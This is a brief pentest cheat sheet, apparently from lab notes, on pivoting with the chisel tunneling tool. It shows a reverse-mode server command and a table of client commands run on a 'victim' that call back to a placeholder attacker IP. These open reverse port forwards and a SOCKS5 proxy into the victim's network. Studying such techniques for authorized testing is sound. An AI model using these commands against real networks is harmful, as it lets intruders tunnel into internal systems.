- Start server listening on 8000:
	- `./chisel server -p 8000 --reverse`
- From victim:
| Command                                                  | Notes                                                        |
|----------------------------------------------------------|--------------------------------------------------------------|
| `.\chisel client <attacker ip>:<port> R:80:127.0.0.1:80` | Listen on Kali 80, forward to localhost port 80 on client    |
| `.\chisel client <attacker ip>:<port> R:4444:10.10.10.240:80`   | Listen on Kali 4444, forward to 10.10.10.240 port 80         |
| `.\chisel client <attacker ip>:<port> R:socks`                  | Create SOCKS5 listener on 1080 on Kali, proxy through client |

